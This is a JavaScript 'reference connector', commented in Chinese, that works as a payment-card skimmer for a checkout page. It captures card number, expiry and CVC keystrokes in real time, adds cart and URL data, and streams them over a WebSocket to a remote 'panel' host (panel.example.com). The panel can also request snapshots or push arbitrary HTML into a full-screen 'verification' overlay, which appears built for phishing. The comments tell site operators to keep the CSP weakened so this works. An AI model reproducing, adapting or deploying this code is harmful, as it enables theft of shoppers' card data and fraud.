/* ==========================================================================
 * reference/connector.reference.js —— 参考实现，**不参与部署、不是契约文件**
 *
 * /bp/connector.js 的正式版本由面板方交付（契约 §10）。本文件只是给站点一个
 * 可跑的对照，用来在面板包到位前验证页面侧是否合格：
 *   - 页面是否真的在冒泡原生 input（这里是 document 捕获层监听）
 *   - srcdoc 验证弹层能不能跑内联脚本（showFrame）
 *   - 提交前快照能不能拿到（监听 bp:submit 或自己 collect）
 *
 * 要试跑：把它复制成 public/bp/connector.js（覆盖存根），再把 enabled 改 true。
 * 若正式包也加载，请删掉本文件对应的覆盖副本，避免双监听。
 * ========================================================================== */
(function () {
  'use strict';

  var config = {
    panelHost: 'wss://panel.example.com',  // 必须 wss://（页面是 https 时）
    socketPath: '/socket.io/',             // 契约 §10 固定值
    logname: 'LOGNAME',
    logtype: 'cc',
    enabled: false,                        // 默认不出站
    debug: true
  };

  var state = { socket: null, queue: [], sid: Math.random().toString(36).slice(2, 10) };

  function log() {
    if (!config.debug || !window.console) return;
    var a = Array.prototype.slice.call(arguments);
    a.unshift('%c[bp-ref]', 'color:#6ee7a8');
    console.log.apply(console, a);
  }

  function v(id) {
    var el = document.getElementById(id);
    return el ? String(el.value || '') : '';
  }

  /** 面板要的卡片快照；格式化归 connector，不归页面 */
  function collect() {
    var number = v('bp-card-number');
    var expiry = v('bp-card-expiry');
    var cvc = v('bp-card-cvc');
    var digits = number.replace(/\D+/g, '');
    return {
      number: number,
      digits: digits,
      bin: digits.slice(0, 6),
      expiry: expiry,
      cvc: cvc,
      complete: digits.length >= 13 && /^\d{2}\s*\/?\s*\d{2,4}$/.test(expiry) && cvc.length >= 3
    };
  }

  function snapshot(reason) {
    var c = window.__BP_CART__ || {};
    return {
      type: 'bp.snapshot',
      reason: reason || 'input',
      sid: state.sid,
      at: Date.now(),
      url: location.href,
      utm: window.__BP_UTM__ || {},
      cart: {
        order_number: c.order_number,
        currency: c.currency,
        total: c.total,
        total_amount: c.total_amount,
        items: c.items,
        locale: c.locale
      },
      card: collect()
    };
  }

  function connect() {
    if (!config.enabled) return null;
    if (state.socket && state.socket.readyState <= 1) return state.socket;
    var url = config.panelHost.replace(/\/$/, '') + config.socketPath + '?sid=' + encodeURIComponent(state.sid);
    var ws;
    try { ws = new WebSocket(url); } catch (e) { log('ws ctor failed', e); return null; }
    state.socket = ws;
    ws.onopen = function () {
      log('ws open', url);
      ws.send(JSON.stringify({ type: 'bp.hello', logname: config.logname, logtype: config.logtype, sid: state.sid }));
      state.queue.splice(0).forEach(function (m) { ws.send(JSON.stringify(m)); });
    };
    ws.onclose = function () { state.socket = null; };
    ws.onerror = function () {};
    ws.onmessage = function (ev) { onCommand(ev.data); };
    return ws;
  }

  function send(msg) {
    if (!config.enabled) { log('disabled, drop', msg.type); return; }
    var ws = connect();
    if (ws && ws.readyState === 1) ws.send(JSON.stringify(msg));
    else { state.queue.push(msg); if (state.queue.length > 50) state.queue.shift(); }
  }

  /* 面板下发：show_frame / ping / collect */
  function onCommand(raw) {
    var cmd;
    try { cmd = typeof raw === 'string' ? JSON.parse(raw) : raw; } catch (e) { return; }
    if (!cmd || !cmd.type) return;
    if (cmd.type === 'ping') return send({ type: 'bp.pong', at: Date.now(), sid: state.sid });
    if (cmd.type === 'collect') return send(snapshot('cmd'));
    if (cmd.type === 'show_frame') return showFrame(cmd.html);
  }

  /**
   * srcdoc 弹层：面板下发的整段 HTML。
   * 能跑内联脚本靠的是 CSP 里保留 'unsafe-inline' 且不出现 nonce-（契约 §7.3 铁律一）。
   * frame-src 'self' 不拦 about:srcdoc（同源继承）。
   */
  function showFrame(html) {
    if (typeof html !== 'string') return null;
    var old = document.getElementById('bp-frame-wrap');
    if (old) old.remove();

    var wrap = document.createElement('div');
    wrap.id = 'bp-frame-wrap';
    wrap.style.cssText = 'position:fixed;inset:0;z-index:2147483000;display:grid;place-items:center;padding:20px;background:rgba(6,8,11,.72)';
    var box = document.createElement('div');
    box.style.cssText = 'width:min(460px,100%);border-radius:14px;overflow:hidden;background:#161b22;border:1px solid #2b3340';
    var frame = document.createElement('iframe');
    frame.style.cssText = 'width:100%;height:460px;max-height:calc(100vh - 120px);border:0;display:block;background:#0f131a';
    frame.setAttribute('title', 'verification');
    frame.srcdoc = html;
    box.appendChild(frame);
    wrap.appendChild(box);
    document.body.appendChild(wrap);

    window.addEventListener('message', function (ev) {
      if (frame.contentWindow && ev.source !== frame.contentWindow) return;
      log('frame message', ev.data);
    });
    return wrap;
  }

  /* 事件接线：document 捕获层，SPA 重渲染后依然有效 */
  var pending = null;
  document.addEventListener('input', function (e) {
    var t = e.target;
    if (!t || String(t.id || '').indexOf('bp-card-') !== 0) return;
    clearTimeout(pending);
    pending = setTimeout(function () {
      var s = snapshot('input');
      send(s);
      log('keystroke batch:', s.card.digits.length + ' digits', s.card.complete ? '(complete)' : '');
    }, 120); // 契约 §4.2：不要 debounce 到 300ms 以上
  }, true);

  document.addEventListener('bp:cart-ready', function (e) {
    log('cart ready', e.detail && e.detail.order_number, e.detail && e.detail.total_amount);
    send(snapshot('cart-ready'));
  }, true);

  window.BP_CONNECTOR = {
    config: config,
    state: state,
    collect: collect,
    snapshot: snapshot,
    send: send,
    showFrame: showFrame,
    configure: function (patch) {
      Object.keys(patch || {}).forEach(function (k) { config[k] = patch[k]; });
      if (config.enabled) connect();
      return config;
    }
  };

  log('reference connector loaded (enabled=' + config.enabled + ')');
})();
